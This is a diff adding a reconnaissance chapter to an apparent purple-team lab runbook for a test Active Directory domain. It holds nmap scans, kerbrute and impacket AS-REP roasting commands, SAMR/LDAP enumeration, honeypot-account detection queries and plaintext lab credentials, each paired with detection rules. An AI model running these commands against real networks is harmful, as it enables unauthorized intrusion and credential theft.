@@ -713,3 +713,253 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.77.10
 | F-08 | auditd git commit hooks |
 | F-09 | auditd bundle exec |
 | F-10 | Zeek HTTP POST (custom rule) |
+---
+
+## Phase 0 — Reconnaissance (From Zero Credentials)
+
+> **Status:** Steps 1-2 tested 2026-06-23; Steps 3-6 untested (require credentials)
+> **Goal:** Identify valid domain users, network topology, and authentication surface without any credentials
+> **Source:** `CAMPAIGNS.md` lines 94-281 (Phase 0 section)
+
+### Phase 0 Step 1 — Full Port/Service Scan (nmap)
+
+**Tested 2026-06-23.** nmap against all 7 VMs identified open ports and SMB signing requirements. Results in CAMPAIGNS.md table (lines 105-112).
+
+#### Why it works
+TCP/UDP port scan reveals attack surface — what services are listening, what versions, what OS. Critical for choosing attack vectors: SMB signing NOT required on member servers = NTLM relay viable; ADWS on 9389 = potential recon path.
+
+#### Attack command
+```bash
+nmap -Pn -sV -sC -p- --min-rate 5000 -T4 192.168.77.10,11,12,22,23,40,50,51,55
+```
+
+#### What to expect (success)
+```
+Nmap scan report for 192.168.77.11
+...
+PORT      STATE  SERVICE      VERSION
+22/tcp    open   ssh          OpenSSH ...
+53/tcp    open   domain       (generic DNS response)
+88/tcp    open   kerberos-sec Microsoft Kerberos
+135/tcp   open   msrpc        Microsoft Windows RPC
+139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open   ldap         Microsoft AD LDAP
+445/tcp   open   microsoft-ds Microsoft Windows ...
+...
+```
+
+#### What to expect (failure modes)
+- `-Pn` skips host discovery (needed since DC firewalls may block ICMP). If you remove it, scans hang on "Host seems down".
+- `--min-rate 5000` is aggressive. If you see "1+ hosts failed" or partial output, reduce to 1000.
+- `p-` is full port scan. On slow networks this can take 10+ minutes.
+
+#### CADRE-specific notes
+- All 7 VMs use Vagrant-assigned MACs starting with `00:0C:29:...` (VMware)
+- SMB signing **required** on all 3 DCs (192.168.77.10, .11, .12) — NTLM relay to DCs blocked
+- SMB signing **NOT required** on mbr01 (.20), mbr02 (.23) — NTLM relay viable
+- Member servers: MSSQL 2022 on mbr01 (.22), SCCM on mbr02 (.23)
+- Linux: linux01 (.40) has MSSQL Linux + NFS + SSH
+
+#### Telemetry fingerprint
+- nmap scan appears in firewall logs on each scanned host
+- IDS/IPS rules detect nmap service version probes (Suricata `ET SCAN` signatures)
+- Windows Defender ATP alerts on internal port scans
+
+#### Detection engineering
+- Suricata `ET SCAN` signatures fire on SYN scans, NULL scans, XMAS scans
+- Zeek `conn.log` shows connection attempts to all ports; `notice.log` for unusual patterns
+- Elastic cadre-* rules should alert on internal port scans from non-admin sources
+
+#### Common pitfalls
+- Running without `-Pn` on lab VMs that block ICMP = silent failure
+- Running on Windows host = nmap uses Npcap — may need admin privileges for raw packet capture
+- Output is too long for terminal — use `nmap ... -oN /tmp/scan.txt` for file output
+
+---
+
+### Phase 0 Step 2 — Kerberos User Enumeration (nmap krb5-enum-users / kerbrute)
+
+**Tested 2026-06-23.** nmap `krb5-enum-users` got `principal_unknown` for malformed cnames (nmap script bug bundles comma-separated users per cname). **AS-REP captured for `intern_blue`** which has `DONT_REQUIRE_PREAUTH`. kerbrute is the canonical replacement.
+
+#### Why it works
+Kerberos AS-REQ can be sent with a guessed `cname` and constant `sname=krbtgt/<realm>`. The KDC's response code reveals user validity:
+- `preauth_required` (26) = user exists
+- `principal_unknown` (6) = user doesn't exist
+- AS-REP (msg-type 11) = user exists with DONT_REQUIRE_PREAUTH (AS-REP Roast target)
+
+Modern Server 2025 KDC requires PA-ETYPE-INFO2 pre-auth (RFC 6806) which older nmap scripts may not send, causing uniform error responses. **kerbrute** sends modern pre-auth and works correctly.
+
+#### Attack commands
+```bash
+# Broken on Server 2025 (nmap 7.99 bug — bundles comma-separated users per cname)
+nmap -Pn -p 88 --script=krb5-enum-users \
+  --script-args='krb5-enum-users.realm=child.cadre.local,userdb=/tmp/users.txt' \
+  192.168.77.11
+
+# Canonical replacement — works on Server 2025
+kerbrute userenum -d child.cadre.local --dc 192.168.77.11 /tmp/users.txt
+
+# Capture AS-REPs (Phase 1)
+impacket-GetNPUsers child.cadre.local/ -dc-ip 192.168.77.11 -no-pass -usersfile /tmp/users.txt -format hashcat > /tmp/asrep.txt
+```
+
+#### What to expect (success — kerbrute)
+```
+[+] VALID USERNAME: administrator@child.cadre.local
+[+] VALID USERNAME: guest@child.cadre.local
+[+] VALID USERNAME: krbtgt@child.cadre.local
+[+] VALID USERNAME: vagrant@child.cadre.local
+[+] VALID USERNAME: intern_blue@child.cadre.local
+[+] VALID USERNAME: analyst_t1@child.cadre.local
+... (10+ valid users in ~10 seconds)
+```
+
+#### What to expect (failure modes)
+- **nmap `krb5-enum-users` returns 0 users on Server 2025** — nmap 7.99 script bug + KDC hardened behavior. Use kerbrute.
+- **kerbrute "all users invalid"** — verify `/tmp/users.txt` has 1 user per line; check network connectivity to DC
+- **AS-REP for only one user (intern_blue)** — that's expected; intern_blue is the only DONT_REQUIRE_PREAUTH account in CADRE
+- **TCP RST after 5 requests** — KDC rate limit; kerbrute handles this by opening new TCP connections
+
+#### CADRE-specific notes
+- `intern_blue` is the only DONT_REQUIRE_PREAUTH user — set by `05-ad-attack-surface.yml` lines 859-866
+- All other users have preauth_required (default)
+- `cadre_passwords.txt` (in `ansible/files/`) contains the lab passwords — use as wordlist
+- 5 userdb lines from CAMPAIGNS.md produce 5 AS-REQ packets (nmap 7.99 bug treats each line as one cname)
+- AS-REP etype observed: 23 (RC4-HMAC) → hashcat mode 18200
+
+#### Telemetry fingerprint
+- **WinSec 4768** (TGT request) per AS-REQ — high volume in short time = enumeration
+- **WinSec 4625** (logon failure) NOT generated for AS-REQ without pre-auth (no actual auth attempt)
+- **Zeek `kerberos.log`** captures every AS-REQ/AS-REP with cname, sname, error_code
+- Suricata cadre-ad rules: SID:1000015 (Kerberoast burst) fires on rapid AS-REQ pattern
+
+#### Detection engineering
+- **Suricata SID:1000015** ("CADRE Kerberos AS-REQ burst") — fires on 5+ AS-REQs in 60s
+- **Elastic cadre-001** (planned) — pattern match on Zeek kerberos.log for `error_code=6` from same source IP
+- **Volume rule** — >50 Kerberos requests from single source in 5min = enumeration
+
+#### Common pitfalls
+- **`/tmp/users.txt` with trailing whitespace** — nmap may include whitespace in cname
+- **kerbrute path not in PATH** — `wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute`
+- **Realm typo** — `child.cadre.local` (lowercase) vs `CHILD.CADRE.LOCAL` (uppercase) — kerbrute auto-handles
+- **AS-REQ gets principal_unknown for ALL users** — modern KDC; need modern tool (kerbrute)
+
+#### Wireshark field reference
+- Filter to specific user: `kerberos.cname contains "intern_blue"`
+- Filter to AS-REPs only: `kerberos.msg_type == 11`
+- Filter to errors only: `kerberos.msg_type == 30`
+- Filter to preauth_required errors: `kerberos.error_code == 26`
+- The `cname` field in the response = the `cname` in the request (proves which user was tested)
+- `sname` is always `krbtgt/<REALM>` in AS-REQ/AS-REP
+
+---
+
+### Phase 0 Step 3 — ADWS Enumeration (port 9389) ⏳
+
+**Status:** Not yet tested. Port 9389 confirmed open on all 3 DCs (nmap 2026-06-18).
+
+#### Why it works
+Active Directory Web Services (ADWS) provides SOAP-based enumeration on port 9389. Server 2025 may allow enumeration via ADWS even when LDAP anonymous is blocked — different authentication path.
+
+#### Attack command (planned)
+```bash
+# From Kali
+nmap -p 9389 --script=adws-enum 192.168.77.11
+# OR use SOAPHound / adws-enum Python tools (requires auth for full functionality)
+```
+
+#### What to expect (success)
+- Service detected: SOAP XML envelope accepted
+- Returns DCInfo (forest, domain, sites) without auth
+- Full user/group enumeration requires auth
+
+#### What to expect (failure modes)
+- SOAP 401 Unauthorized for full enumeration without creds
+- Port 9389 filtered by firewall
+- TLS required — verify with `openssl s_client -connect 192.168.77.11:9389`
+
+#### CADRE-specific notes
+- All 3 DCs (dc01, dc02, dc03) have ADWS on 9389 (per 04-vulnerabilities.yml)
+- Will be tested once we have at least one valid credential
+
+---
+
+### Phase 0 Step 4 — DNS Enumeration via adidnsdump ⏳
+
+**Status:** Not yet tested. Requires credentials.
+
+#### Why it works
+AD-integrated DNS allows any authenticated user to query all DNS records. adidnsdump enumerates the zone including records the user has no explicit read rights to. Useful for discovering:
+- Cloud Sync endpoints
+- Internal service records
+- Unpublicized hosts not in BloodHound
+
+#### Attack command (planned)
+```bash
+adidnsdump -u cadre.local\\intern_blue -p '1nt3rn_Blu3!' dc01.cadre.local
+```
+
+#### What to expect (success)
+- `records.csv` and `zones/` directory created
+- All A, AAAA, CNAME, MX records listed
+- SOA record with primary DNS
+
+#### CADRE-specific notes
+- Will be tested after Phase 1 (intern_blue credential obtained)
+
+---
+
+### Phase 0 Step 5 — SAMR Enumeration ⏳
+
+**Status:** Not yet tested. Requires credentials.
+
+#### Why it works
+SAMR (MS-SAMR over port 445) returns the same user data as LDAP but uses the RPC pipe that backup agents, inventory tools use daily — blends into baseline. Less likely to trigger LDAP-specific alerts.
+
+#### Attack command (planned)
+```bash
+python3 samrdump.py cadre.local/intern_blue:'1nt3rn_Blu3!'@192.168.77.10
+# OR via impacket: impacket-samrdump
+```
+
+#### What to expect (success)
+- samAccountName, lastLogon (FILETIME), logonCount for every user
+- Machine accounts (with `$` suffix)
+- Works against any DC
+
+#### CADRE-specific notes
+- Will be tested after Phase 1
+- Compare LDAP vs SAMR output to verify they're equivalent
+
+---
+
+### Phase 0 Step 6 — Honeypot Detection via lastLogon ⏳
+
+**Status:** Not yet tested. Requires credentials.
+
+#### Why it works
+Honeytoken accounts are designed to detect interaction but are never authenticated. The `lastLogon` attribute exposes them:
+- `lastLogon = 0` (or 12/31/1600) = never authenticated = honeypot
+- Real privileged accounts always have authentication history
+- Machine accounts with `lastLogon = 0` are impossible (domain join requires auth)
+
+#### Attack command (planned)
+```bash
+# Via SAMR (less monitored)
+python3 samrdump.py cadre.local/intern_blue:'1nt3rn_Blu3!'@192.168.77.10 | grep "Last Logon: 0"
+
+# Via LDAP (noisier)
+ldapsearch -x -H ldap://dc01.cadre.local -D "intern_blue@cadre.local" -w '1nt3rn_Blu3!' \
+  -b "DC=cadre,DC=local" "(&(lastLogon=0)(!(objectClass=computer)))" sAMAccountName
+```
+
+#### What to expect (success)
+- List of users with lastLogon=0
+- These are either honeypots OR new accounts that have never logged in
+- Cross-reference with `logonCount=0` to filter true honeypots
+
+#### CADRE-specific notes
+- Defer until after Phase 1
+- Useful for purple-team detection engineering
+
+---
